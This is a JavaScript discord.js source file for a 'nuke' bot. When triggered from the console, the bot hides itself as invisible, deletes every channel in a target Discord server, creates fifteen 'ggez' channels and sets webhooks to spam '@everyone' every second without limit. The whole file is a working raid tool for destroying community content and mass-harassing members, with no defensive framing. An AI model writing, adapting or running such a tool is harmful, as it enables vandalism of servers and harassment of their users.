const Discord = require('discord.js');
const client = new Discord.Client();

// Token
const botToken = 'token';

// ID
const serverId = 'id';

// Console command
const commande = 'spam';

// Channel
const nombreCanaux = 15;

// Prefix
const prefixeNomCanaux = 'ggez';

// Message
const nombreMessages = Infinity;

// Del all channel
async function supprimerCanaux() {
  const server = client.guilds.cache.get(serverId);

  server.channels.cache.forEach(async (channel) => {
    await channel.delete().catch(console.error);
  });
}

// Make channel
async function creerCanaux() {
  const server = client.guilds.cache.get(serverId);

  for (let i = 1; i <= nombreCanaux; i++) {
    const nomCanal = `${prefixeNomCanaux}${i}`;

    await server.channels.create(nomCanal, { type: 'text' }).catch(console.error);
  }
}

// Create webhook
async function creerWebhooksEtEnvoyerMessages() {
  const server = client.guilds.cache.get(serverId);

  server.channels.cache.forEach(async (channel) => {
    if (channel.type === 'text') {
      const webhook = await channel.createWebhook('Webhook', {
        avatar: 'https://i.imgur.com/AfFp7pu.png', // Webhook URL
      }).catch(console.error);

      if (webhook) {
        let messageCount = 0;
        setInterval(() => {
          webhook.send('@everyone')
            .then(() => {
              messageCount++;
              if (messageCount >= nombreMessages) {
                clearInterval();
              }
            })
            .catch(console.error);
        }, 1000); // send message every second
      }
    }
  });
}

client.on('ready', () => {
  console.log(`Connecté en tant que ${client.user.tag}`);

  // bot offline
  client.user.setPresence({ status: 'invisible' })
    .then(() => console.log('Bot offline'))
    .catch(console.error);

  // listen command console
  process.stdin.on('data', (data) => {
    const input = data.toString().trim();

    // verif command
    if (input === commande) {
      supprimerCanaux()
        .then(() => creerCanaux())
        .then(() => creerWebhooksEtEnvoyerMessages())
        .catch(console.error);
    }
  });
});

// login
client.login(botToken);
